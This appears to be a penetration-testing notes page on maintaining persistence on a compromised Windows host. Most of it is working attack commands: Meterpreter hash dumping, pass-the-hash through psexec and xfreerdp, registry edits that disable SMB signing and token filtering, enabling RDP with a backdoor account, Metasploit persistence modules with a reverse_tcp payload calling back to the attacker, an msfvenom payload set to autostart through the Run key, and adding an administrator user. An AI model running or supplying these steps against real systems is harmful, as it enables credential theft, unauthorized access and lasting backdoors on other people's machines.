# k - Persistence

### Maintaining Access

* Password Hash -> \[pass the hash or crack the hash]
* Backdoor
* New Users

Persistence ensures we will be able to reconnect to the compromised machine any time we llike even if the machine is rebooted or patched. To do so, we can try to gather credentials to access remote services such as RDP, SSH, VNC, VPN, create backdoors, new users, edit current services or install new vulnerabilities on the Victim.

{% code overflow="wrap" lineNumbers="true" %}
```bash
# asuming we already gained NT AUTHORITY on the victim system.
# 1st thing to do is to make the current session stable, ie by migrating to a more stable process.
meterpreter > ps # list all running prrocesses.
meterpreter > getpid # displays our current running process ID.
meterpreter > migrate <PID> # migrate to either svchost.exe or explorer.exe.

# 2nd thing is to retrieve hashes.
meterpreter > hashdump # dumps all hashes.
# or use another module to do this...
meterpreter > run post/windows/gather/smart_hashdump # dumps all hashes.
# if experiencing error, migrate to another process and try again.

# we can try the pass-the-hash method to login.
msf > use exploit/windows/smb/psexec
msf > set RHOST victim ip
msf > set SMBUSER <username>
msf > set SMBPASS <paste the hash>
msf > run # sometime login will fail because we don't have access to administrative shares, since we already have NT AUTHORITY, we just need to set a registry entry and the module should work.

# enter the cmd:
reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -v LocalAccountTokenFIlterPolicy -t REG_DWORD -d 1

# or 
#========================================================================
cmd> reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

cmd> reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f
#========================================================================

# copy and pase into the Meterpreter session.
# the module should work now, but if the user changes his/her password we loose our access.

# 3rd thing is we can create a new user and enable RDP if not enabled.
# check if RDP is enabled or not, in kali terminal:
xfreerdp /v:192.168.0.11 # if no response, then RDP is not enabled.

meterpreter > run getgui # displays help menu.
meterpreter > run -e -u atk -p atk # enable rdp and create new user.

# check again.
xfreerdp /v:192.168.0.11 /u:atk /p:atk # login with RDP.

# Pass the NTLM hash attack using xfreerdp
# if we obtain the NTLM hash, we can use it to login RDP using xfreerdp:
xfreerdp /u:admin /d:domain_name /pth:<ntlm_hash> /v:$ip

# 4th
# installing a Backdoor on the target.
msf > use exploit/windows/local/persistence
msf >  set SESSION
msf > set STARTUP SYSTEM # since we have system privs.
msf > set payload windows/meterpreter/reverse_tcp
msf > set LHOST, LPORT 80 
msf > run 
# anytime we want to connect back to this machine, we just set up a listener with same parameters passed (use multi/handler).
# Note this persistence will continue even after the victim pc is rebooted.
# or you can do this through meterpreter
meterpreter > run persistence -A -X -i 5 -p 8080 -r $ip # creates a backdoor, uploads it to victim, and set the registry keys to start it at boot.

# 5th 
# Mannual Persistence on the victim machine.
# a 
# Create the payload with msfvenom.
msfvenom -p windows/meterpreter/reverse_tcp -f vbs ......................
# upload to victim.
meterpreter > upload exploit.exe C:\Windows
# edit the registry keys
meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\exploit.exe" -v exploit.exe
```
{% endcode %}

### Create new user

Another way to establish persistence is to create a new user and add to the administrator group.

```
cmd> net user hacker /add # add new user hacker.
cmd> net localgroup "Administrators" hacker /add # add new user to local admin group.
```
